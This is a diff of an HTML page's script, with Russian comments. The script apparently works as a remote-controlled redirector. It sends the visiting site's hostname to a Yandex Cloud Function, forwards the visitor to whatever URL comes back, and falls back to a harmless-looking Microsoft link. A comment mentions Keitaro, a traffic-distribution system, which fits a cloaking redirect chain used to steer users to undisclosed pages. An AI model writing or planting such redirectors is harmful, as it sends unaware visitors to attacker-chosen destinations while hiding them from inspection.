@@ -33,10 +33,13 @@
     </div>
 
     <script>
-        // --- ТВОЯ ССЫЛКА ОТ ЯНДЕКС ОБЛАКА ---
-        const YANDEX_FUNCTION_URL = "https://functions.yandexcloud.net/d4e5bqhobljvknj550vf"; 
+        // ТВОЯ ССЫЛКА ОТ ЯНДЕКС ОБЛАКА (без изменений)
+        const BASE_YANDEX_URL = "https://functions.yandexcloud.net/d4e5bqhobljvknj550vf"; 
+        
+        // МАГИЯ: Передаем текущий домен в параметре ?site=
+        const YANDEX_FUNCTION_URL = BASE_YANDEX_URL + "?site=" + encodeURIComponent(window.location.hostname);
 
-        const MIN_DELAY = 1000; 
+        const MIN_DELAY = 1000; // Уменьшили задержку до 1 сек
         const startTime = Date.now();
 
         setTimeout(() => {
@@ -46,26 +49,24 @@
         function redirectTo(url) {
             const elapsedTime = Date.now() - startTime;
             const timeLeft = Math.max(0, MIN_DELAY - elapsedTime);
-            
             setTimeout(() => {
                 window.location.replace(url);
             }, timeLeft);
         }
 
-                       fetch(YANDEX_FUNCTION_URL)
+        fetch(YANDEX_FUNCTION_URL)
             .then(response => response.json())
             .then(data => {
-                // Проверяем, что ссылка реально пришла
+                // Если Яндекс вернул ссылку - переходим
                 if (data && data.url && data.url !== "undefined" && data.url !== "null") {
                     redirectTo(data.url);
                 } else {
-                    // Если Яндекс вернул пустоту, ведем на Microsoft
-                    // (Никаких Base64 ссылок на Keitaro!)
+                    // Если пусто - на Microsoft
                     redirectTo("https://go.microsoft.com/fwlink/?LinkId=521839");
                 }
             })
             .catch(error => {
-                // Если Яндекс недоступен, ведем на заглушку Microsoft
+                // Если Яндекс недоступен - на Microsoft
                 redirectTo("https://go.microsoft.com/fwlink/?LinkId=521839");
             });
     </script>
